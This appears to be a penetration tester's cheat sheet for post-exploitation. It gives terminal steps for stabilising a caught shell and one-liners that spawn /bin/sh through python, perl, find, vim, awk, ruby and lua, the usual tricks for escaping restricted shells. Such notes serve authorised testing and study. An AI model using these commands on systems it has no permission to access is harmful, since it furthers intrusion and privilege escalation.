#Estabilization
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
#Then press Enter twice, and then enter:
export TERM=xterm

# Spawn a interactive session with python
python3 -c 'import pty;pty.spawn("/bin/sh")'

#Perl
perl -e 'exec "/bin/sh"';

#find
find / -name NAMEOFFILE -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

#vim to shell
vim -c ':!/bin/sh'
vim
 :set shell=/bin/sh
 :shell

#sh
/bin/sh -i

#Ruby
ruby: exec "/bin/sh"

#AWK
awk 'BEGIN {system("/bin/sh")}'

#Lua
lua: os.execute('/bin/sh')